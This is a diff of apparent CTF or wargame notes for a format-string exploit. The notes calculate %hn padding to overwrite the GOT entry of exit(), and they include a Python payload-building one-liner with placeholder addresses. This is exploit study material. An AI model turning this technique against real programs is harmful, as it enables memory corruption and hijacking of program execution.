@@ -17,3 +17,15 @@ we're going to use $n so we need to know where the nth stack argument is:
 PADDING FIRST 4 BYTES = 0xd6dc = 55004 - 8 (8 bytes already written for both GOT address of exit() ) = 54996
 PADDING LAST 4 BYTES = 0xffff = 65535 => (65536 - 55004) + 65535 % 65536
 `python -c 'import struct; print struct.pack("<I", GOT exit() ) + struct.pack("<I", GOT exit() + 2 bytes ) + "%PADDING FIRST BYTESc%10$hn" + "%PADDING LAST BYTESc%11$hn"' > /tmp/lvl05`
+
+
+
+0xffff 0xd64b
+
+0xd64b = 54859 - 8 = 54851
+0xffff = (65536 - 54859 + 65535) % 65536 =  10676
+
+0xffff 0xd44b
+
+
+
